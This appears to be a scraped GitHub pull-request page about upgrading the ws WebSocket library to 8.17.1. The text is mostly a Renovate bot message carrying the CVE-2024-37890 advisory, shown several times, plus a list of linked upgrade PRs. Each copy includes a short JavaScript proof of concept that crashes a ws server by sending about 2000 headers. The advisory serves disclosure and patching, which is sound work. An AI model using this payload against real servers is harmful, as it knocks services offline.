[`--max-http-header-size=size`][--max-http-header-size=size] and/or the
[`maxHeaderSize`][maxHeaderSize] options so
that no more headers than the `server.maxHeadersCount` limit can be
sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]:
https://nodejs.org/api/cli.html#--max-http-header-sizesize

[`maxHeaderSize`]:
https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener

[`server.maxHeadersCount`]:
https://nodejs.org/api/http.html#servermaxheaderscount

</details>

---

### Configuration

ðŸ“… **Schedule**: Branch creation - \"\" (UTC), Automerge - At any time (no
schedule defined).

ðŸš¦ **Automerge**: Enabled.

â™» **Rebasing**: Whenever PR becomes conflicted, or you tick the
rebase/retry checkbox.

ðŸ”• **Ignore**: Close this PR and you won't be reminded about this update
again.

---

- [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check
this box

---

This PR was generated by [Mend
Renovate](https://www.mend.io/free-developer-tools/renovate/). View the
[repository job log](https://developer.mend.io/github/camunda/camunda).

<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzOC4yMC4xIiwidXBkYXRlZEluVmVyIjoiMzguMjAuMSIsInRhcmdldEJyYW5jaCI6Im1haW4iLCJsYWJlbHMiOlsiYXJlYS9zZWN1cml0eSIsImF1dG9tZXJnZSJdfQ==-->")[#20945](https://github.com/camunda/camunda/pull/20945)[)](/camunda/camunda/commit/d0eeedcfec0669b66458957d545a4e8c4fac52cd "deps: Update dependency ws to v8.17.1 [SECURITY] (main) (#20945)

[![Mend
Renovate](https://app.renovatebot.com/images/banner.svg)](https://renovatebot.com)

This PR contains the following updates:

| Package | Change | Age | Adoption | Passing | Confidence |
|---|---|---|---|---|---|
| [ws](https://togithub.com/websockets/ws) | [`8.17.0` ->
`8.17.1`](https://renovatebot.com/diffs/npm/ws/8.17.0/8.17.1) |
[![age](https://developer.mend.io/api/mc/badges/age/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![adoption](https://developer.mend.io/api/mc/badges/adoption/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![passing](https://developer.mend.io/api/mc/badges/compatibility/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|
[![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/)
|

---

> [!WARNING]
> Some dependencies could not be looked up. Check the Dependency
Dashboard for more information.

### GitHub Vulnerability Alerts

####
[CVE-2024-37890](https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
(https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)
and backported to ws@7.5.10
(https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f),
ws@6.2.3
(https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63),
and ws@5.2.4
(https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

The vulnerability was reported by [Ryan
LaPointe](https://togithub.com/rrlapointe) in
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

### References

-
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)
-
[https://github.com/websockets/ws/pull/2231](https://togithub.com/websockets/ws/pull/2231)

[`--max-http-header-size=size`]:
https://nodejs.org/api/cli.html#--max-http-header-sizesize
[`maxHeaderSize`]:
https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
[`server.maxHeadersCount`]:
https://nodejs.org/api/http.html#servermaxheaderscount

---

### Release Notes

<details>
<summary>websockets/ws (ws)</summary>

### [`v8.17.1`](https://togithub.com/websockets/ws/releases/tag/8.17.1)

[Compare
Source](https://togithub.com/websockets/ws/compare/8.17.0...8.17.1)

### Bug fixes

- Fixed a DoS vulnerability
([#&#8203;2231](https://togithub.com/websockets/ws/issues/2231)).

A request with a number of headers exceeding
the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = \"!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~\".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan
LaPointe](https://togithub.com/rrlapointe) in
[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230).

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1.  Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][--max-http-header-size=size] and/or the
[`maxHeaderSize`][maxHeaderSize] options so
that no more headers than the `server.maxHeadersCount` limit can be
sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]:
https://nodejs.org/api/cli.html#--max-http-header-sizesize

[`maxHeaderSize`]:
https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener

[`server.maxHeadersCount`]:
https://nodejs.org/api/http.html#servermaxheaderscount

</details>

---

### Configuration

ðŸ“… **Schedule**: Branch creation - \"\" (UTC), Automerge - At any time (no
schedule defined).

ðŸš¦ **Automerge**: Enabled.

â™» **Rebasing**: Whenever PR becomes conflicted, or you tick the
rebase/retry checkbox.

ðŸ”• **Ignore**: Close this PR and you won't be reminded about this update
again.

---

- [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check
this box

---

This PR was generated by [Mend
Renovate](https://www.mend.io/free-developer-tools/renovate/). View the
[repository job log](https://developer.mend.io/github/camunda/camunda).

<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzOC4yMC4xIiwidXBkYXRlZEluVmVyIjoiMzguMjAuMSIsInRhcmdldEJyYW5jaCI6Im1haW4iLCJsYWJlbHMiOlsiYXJlYS9zZWN1cml0eSIsImF1dG9tZXJnZSJdfQ==-->")`
â€¦

`[d0eeedc](/camunda/camunda/commit/d0eeedcfec0669b66458957d545a4e8c4fac52cd)`

```
[![Mend
Renovate]([https://app.renovatebot.com/images/banner.svg)](https://renovatebot.com](https://app.renovatebot.com/images/banner.svg%29%5D%28https%3A//renovatebot.com))

This PR contains the following updates:

| Package | Change | Age | Adoption | Passing | Confidence |
|---|---|---|---|---|---|
| [ws](<https://togithub.com/websockets/ws>) | [`8.17.0` ->
`8.17.1`](<https://renovatebot.com/diffs/npm/ws/8.17.0/8.17.1>) |
[![age](<https://developer.mend.io/api/mc/badges/age/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/>)
|
[![adoption](<https://developer.mend.io/api/mc/badges/adoption/npm/ws/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/>)
|
[![passing](<https://developer.mend.io/api/mc/badges/compatibility/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/>)
|
[![confidence](<https://developer.mend.io/api/mc/badges/confidence/npm/ws/8.17.0/8.17.1?slim=true)](https://docs.renovatebot.com/merge-confidence/>)
|

---

> [!WARNING]
> Some dependencies could not be looked up. Check the Dependency
Dashboard for more information.

### GitHub Vulnerability Alerts

####
[[CVE-2024-37890](https://github.com/advisories/GHSA-3h5v-q93c-6h6q "CVE-2024-37890")](<https://togithub.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q>)

### Impact

A request with a number of headers exceeding
the[`server.maxHeadersCount`][] threshold could be used to crash a ws
server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1
([websockets/ws@e55e510](https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c))
and backported to ws@7.5.10
([websockets/ws@22c2876](https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)),
ws@6.2.3
([websockets/ws@eeb76d3](https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)),
and ws@5.2.4
([websockets/ws@4abd8f6](https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e))

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1. Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options
so that no more headers than the `server.maxHeadersCount` limit can be
sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

The vulnerability was reported by [Ryan
LaPointe](<https://togithub.com/rrlapointe>) in
[[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29).

### References

-
[[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29)
-
[[https://github.com/websockets/ws/pull/2231](https://togithub.com/websockets/ws/pull/2231)](https://github.com/websockets/ws/pull/2231%5D%28https%3A//togithub.com/websockets/ws/pull/2231%29)

[`--max-http-header-size=size`]:
<https://nodejs.org/api/cli.html#--max-http-header-sizesize>
[`maxHeaderSize`]:
<https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener>
[`server.maxHeadersCount`]:
<https://nodejs.org/api/http.html#servermaxheaderscount>

---

### Release Notes

<details>
<summary>websockets/ws (ws)</summary>

### [`v8.17.1`](<https://togithub.com/websockets/ws/releases/tag/8.17.1>)

[Compare
Source](<https://togithub.com/websockets/ws/compare/8.17.0...8.17.1>)

### Bug fixes

- Fixed a DoS vulnerability
([#&[#8203](https://github.com/camunda/camunda/pull/8203);2231](<https://togithub.com/websockets/ws/issues/2231>)).

A request with a number of headers exceeding
the[`server.maxHeadersCount`][server.maxHeadersCount]
threshold could be used to crash a ws server.

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

The vulnerability was reported by [Ryan
LaPointe](<https://togithub.com/rrlapointe>) in
[[https://github.com/websockets/ws/issues/2230](https://togithub.com/websockets/ws/issues/2230)](https://github.com/websockets/ws/issues/2230%5D%28https%3A//togithub.com/websockets/ws/issues/2230%29).

In vulnerable versions of ws, the issue can be mitigated in the
following ways:

1.  Reduce the maximum allowed length of the request headers using the
[`--max-http-header-size=size`][--max-http-header-size=size] and/or the
[`maxHeaderSize`][maxHeaderSize] options so
that no more headers than the `server.maxHeadersCount` limit can be
sent.
2.  Set `server.maxHeadersCount` to `0` so that no limit is applied.

[`--max-http-header-size=size`]:
<https://nodejs.org/api/cli.html#--max-http-header-sizesize>

[`maxHeaderSize`]:
<https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener>

[`server.maxHeadersCount`]:
<https://nodejs.org/api/http.html#servermaxheaderscount>

</details>

---

### Configuration

ðŸ“… **Schedule**: Branch creation - "" (UTC), Automerge - At any time (no
schedule defined).

ðŸš¦ **Automerge**: Enabled.

â™» **Rebasing**: Whenever PR becomes conflicted, or you tick the
rebase/retry checkbox.

ðŸ”• **Ignore**: Close this PR and you won't be reminded about this update
again.

---

- [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check
this box

---

This PR was generated by [Mend
Renovate](<https://www.mend.io/free-developer-tools/renovate/>). View the
[repository job log](<https://developer.mend.io/github/camunda/camunda>).

<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzOC4yMC4xIiwidXBkYXRlZEluVmVyIjoiMzguMjAuMSIsInRhcmdldEJyYW5jaCI6Im1haW4iLCJsYWJlbHMiOlsiYXJlYS9zZWN1cml0eSIsImF1dG9tZXJnZSJdfQ==-->
```

[![@INexizI](https://avatars.githubusercontent.com/u/39536903?s=40&v=4)](/INexizI)
[INexizI](/INexizI)
mentioned this pull request
[Aug 10, 2024](#ref-pullrequest-2458988089)

[[Snyk] Upgrade ws from 8.17.1 to 8.18.0
INexizI/KR-DB#382](/INexizI/KR-DB/pull/382)
 Merged

[![@neznaamey](https://avatars.githubusercontent.com/u/110537280?s=40&v=4)](/neznaamey)
[neznaamey](/neznaamey)
mentioned this pull request
[Aug 12, 2024](#ref-pullrequest-2460299762)

[[Snyk] Upgrade ws from 8.13.0 to 8.18.0
neznaamey/DiscordBotClient#24](/neznaamey/DiscordBotClient/pull/24)
 Open

This was referenced Aug 15, 2024

[Fix missing node modules for theme
2pisoftware/cmfive-boilerplate#156](/2pisoftware/cmfive-boilerplate/pull/156)
 Merged

[High severity - Denial of Service (DoS) vulnerability in ws (package.json)
jordaniac89/juice-shop#216](/jordaniac89/juice-shop/issues/216)

Open

[![@tim2zg](https://avatars.githubusercontent.com/u/59140326?s=40&v=4)](/tim2zg)
[tim2zg](/tim2zg)
mentioned this pull request
[Aug 16, 2024](#ref-pullrequest-2469572569)

[[Snyk] Upgrade ws from 8.16.0 to 8.18.0
tim2zg/ioBroker.fronius-wattpilot#58](/tim2zg/ioBroker.fronius-wattpilot/pull/58)
 Merged

This was referenced Aug 21, 2024

[[Snyk] Upgrade ws from 8.13.0 to 8.18.0
ramzimalhas/SillyTavern#4](/ramzimalhas/SillyTavern/pull/4)
 Open

[[Snyk] Upgrade ws from 8.8.1 to 8.18.0
ramzimalhas/BrowserBox#2](/ramzimalhas/BrowserBox/pull/2)
 Open

[![@qdraw](https://avatars.githubusercontent.com/u/1826996?s=40&v=4)](/qdraw)
[qdraw](/qdraw)
mentioned this pull request
[Aug 25, 2024](#ref-pullrequest-2485088532)

[[Snyk] Upgrade ws from 8.17.1 to 8.18.0
qdraw/starsky#1666](/qdraw/starsky/pull/1666)
 Merged

[![@mtsammy40](https://avatars.githubusercontent.com/u/26196974?s=40&v=4)](/mtsammy40)
[mtsammy40](/mtsammy40)
mentioned this pull request
[Aug 29, 2024](#ref-pullrequest-2493978340)

[[Snyk] Upgrade ws from 8.17.0 to 8.18.0
mtsammy40/crypto\_alerts\_api#3](/mtsammy40/crypto_alerts_api/pull/3)
 Open

[![@TitiLaPierre](https://avatars.githubusercontent.com/u/52977803?s=40&v=4)](/TitiLaPierre)
[TitiLaPierre](/TitiLaPierre)
mentioned this pull request
[Sep 1, 2024](#ref-pullrequest-2499211817)

[[Snyk] Upgrade ws from 8.17.1 to 8.18.0
TitiLaPierre/TicTacToe\_NodeJS#5](/TitiLaPierre/TicTacToe_NodeJS/pull/5)
 Merged

[![@X-oss-byte](https://avatars.githubusercontent.com/u/136061549?s=40&v=4)](/X-oss-byte)
[X-oss-byte](/X-oss-byte)
mentioned this pull request
[Sep 7, 2024](#ref-pullrequest-2511341399)

[[Snyk] Upgrade: , , , , , , , , , , , , , , , , bip39, bufferutil, emittery, eth-sig-util, leveldown, tmp-promise, utf-8-validate, ws
X-oss-byte/ganache#677](/X-oss-byte/ganache/pull/677)
 Open

[![@taeb3](https://avatars.githubusercontent.com/u/73064242?s=40&v=4)](/taeb3)
[taeb3](/taeb3)
mentioned this pull request
[Sep 7, 2024](#ref-pullrequest-2511504936)

[[Snyk] Upgrade: browser-or-node, chai, isomorphic-ws, q, thrift, ws
taeb3/gitlabs#155](/taeb3/gitlabs/pull/155)
 Open

[![@FaroukAmr](https://avatars.githubusercontent.com/u/50875890?s=40&v=4)](/FaroukAmr)
[FaroukAmr](/FaroukAmr)
mentioned this pull request
[Sep 8, 2024](#ref-pullrequest-2512277438)

[[Snyk] Upgrade: , dotenv, express, express-rate-limit, express-session, helmet, moment, mongoose, nodemailer, pdfkit, ws
FaroukAmr/Web-Application#1141](/FaroukAmr/Web-Application/pull/1141)
 Open

[![@rater193](https://avatars.githubusercontent.com/u/6468037?s=40&v=4)](/rater193)
[rater193](/rater193)
mentioned this pull request
[Sep 9, 2024](#ref-pullrequest-2513473933)

[[Snyk] Upgrade: folder-hash, simplex-noise, websocket, ws
Homestead-Game-Development/Voxels-Edge-Server#31](/Homestead-Game-Development/Voxels-Edge-Server/pull/31)
 Open

This was referenced Sep 13, 2024

[[Snyk] Upgrade: ms, debug, glob, https-proxy-agent, socks-proxy-agent, stack-utils, ws
organich/playwright#3](/organich/playwright/pull/3)
 Open

[[Snyk] Upgrade: , , acorn, data-uri-to-buffer, dotenv, glob-stream, preact, reflect-metadata, ws
organich/vscode-js-debug#1](/organich/vscode-js-debug/pull/1)
 Open

[![@FaroukAmr](https://avatars.githubusercontent.com/u/50875890?s=40&v=4)](/FaroukAmr)
[FaroukAmr](/FaroukAmr)
mentioned this pull request
[Sep 14, 2024](#ref-pullrequest-2526034550)

[[Snyk] Upgrade: , dotenv, express, express-rate-limit, express-session, helmet, moment, mongoose, nodemailer, pdfkit, ws
FaroukAmr/Web-Application#1146](/FaroukAmr/Web-Application/pull/1146)
 Open

[![@organich](https://avatars.githubusercontent.com/u/107811623?s=40&v=4)](/organich)
[organich](/organich)
mentioned this pull request
[Sep 15, 2024](#ref-pullrequest-2527086545)

[[Snyk] Upgrade: , , acorn, astring, data-uri-to-buffer, dotenv, glob-stream, preact, reflect-metadata, ws
organich/vscode-js-debug#2](/organich/vscode-js-debug/pull/2)
 Open

[![@Roseymr](https://avatars.githubusercontent.com/u/85371212?s=40&v=4)](/Roseymr)
[Roseymr](/Roseymr)
mentioned this pull request
[Sep 17, 2024](#ref-pullrequest-2529860851)

[[Snyk] Upgrade ws from 8.16.0 to 8.18.0
Roseymr/ccxt#3](/Roseymr/ccxt/pull/3)
 Open

[![@X-oss-byte](https://avatars.githubusercontent.com/u/136061549?s=40&v=4)](/X-oss-byte)
[X-oss-byte](/X-oss-byte)
mentioned this pull request
[Sep 19, 2024](#ref-pullrequest-2534982292)

[[Snyk] Upgrade: , , , , , , , , , , , , , , , , bip39, bufferutil, emittery, eth-sig-util, leveldown, tmp-promise, utf-8-validate, ws
X-oss-byte/ganache#687](/X-oss-byte/ganache/pull/687)
 Open

[![@FaroukAmr](https://avatars.githubusercontent.com/u/50875890?s=40&v=4)](/FaroukAmr)
[FaroukAmr](/FaroukAmr)
mentioned this pull request
[Sep 19, 2024](#ref-pullrequest-2535833101)

[[Snyk] Upgrade: , dotenv, express, express-rate-limit, express-session, helmet, moment, mongoose, nodemailer, pdfkit, ws
FaroukAmr/Web-Application#1149](/FaroukAmr/Web-Application/pull/1149)
 Open

[![@neznaamey](https://avatars.githubusercontent.com/u/110537280?s=40&v=4)](/neznaamey)
[neznaamey](/neznaamey)
mentioned this pull request
[Sep 21, 2024](#ref-pullrequest-2540075667)

[[Snyk] Upgrade: axios, discord-protos, electron-store, express, node-fetch, socket.io, ws
neznaamey/DiscordBotClient#30](/neznaamey/DiscordBotClient/pull/30)
 Open

[![@FaroukAmr](https://avatars.githubusercontent.com/u/50875890?s=40&v=4)](/FaroukAmr)
[FaroukAmr](/FaroukAmr)
mentioned this pull request
[Sep 21, 2024](#ref-pullrequest-2540154739)

[[Snyk] Upgrade: , dotenv, express, express-rate-limit, express-session, helmet, moment, mongoose, nodemailer, pdfkit, ws
FaroukAmr/Web-Application#1151](/FaroukAmr/Web-Application/pull/1151)
 Open

[![@neznaamey](https://avatars.githubusercontent.com/u/110537280?s=40&v=4)](/neznaamey)
[neznaamey](/neznaamey)
mentioned this pull request
[Sep 22, 2024](#ref-pullrequest-2540886523)

[[Snyk] Upgrade: axios, discord-protos, electron-store, express, node-fetch, socket.io, ws
neznaamey/DiscordBotClient#31](/neznaamey/DiscordBotClient/pull/31)
 Open

[![@snyk-io](https://avatars.githubusercontent.com/in/372950?s=40&v=4)](/apps/snyk-io)
[snyk-io](/apps/snyk-io)
bot
mentioned this pull request
[Sep 23, 2024](#ref-pullrequest-2541582518)

[[Snyk] Upgrade: commander, koa-compress, ws
SherfeyInv/chii#2](/SherfeyInv/chii/pull/2)
 Open

[![@lirantal](https://avatars.githubusercontent.com/u/316371?s=40&v=4)](/lirantal)
[lirantal](/lirantal)
mentioned this pull request
[Sep 30, 2024](#ref-pullrequest-2555597906)

[[Snyk] Upgrade ws from 8.8.1 to 8.18.0
lirantal/Dependency-Frost#34](/lirantal/Dependency-Frost/pull/34)
 Closed

[![@oji3000](https://avatars.githubusercontent.com/u/17287136?s=40&v=4)](/oji3000)
[oji3000](/oji3000)
mentioned this pull request
[Oct 2, 2024](#ref-pullrequest-2560793413)

[[Snyk] Upgrade ws from 8.6.0 to 8.18.0
rkitagawa-do/sample-websocket#1](/rkitagawa-do/sample-websocket/pull/1)
 Open

[![@Danielhay016](https://avatars.githubusercontent.com/u/103133855?s=40&v=4)](/Danielhay016)
[Danielhay016](/Danielhay016)
mentioned this pull request
[Oct 6, 2024](#ref-pullrequest-2568507974)

[[Snyk] Upgrade ws from 8.13.0 to 8.18.0
Danielhay016/E-photo\_App\_development\_course#14](/Danielhay016/E-photo_App_development_course/pull/14)
 Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fwebsockets%2Fws%2Fpull%2F2231)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [Throws TypeError when there are too many HTTP headers](https://github.com/websockets/ws/issues/2230)

1 participant

[![@lpinca](https://avatars.githubusercontent.com/u/1443911?s=52&v=4)](/lpinca)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.

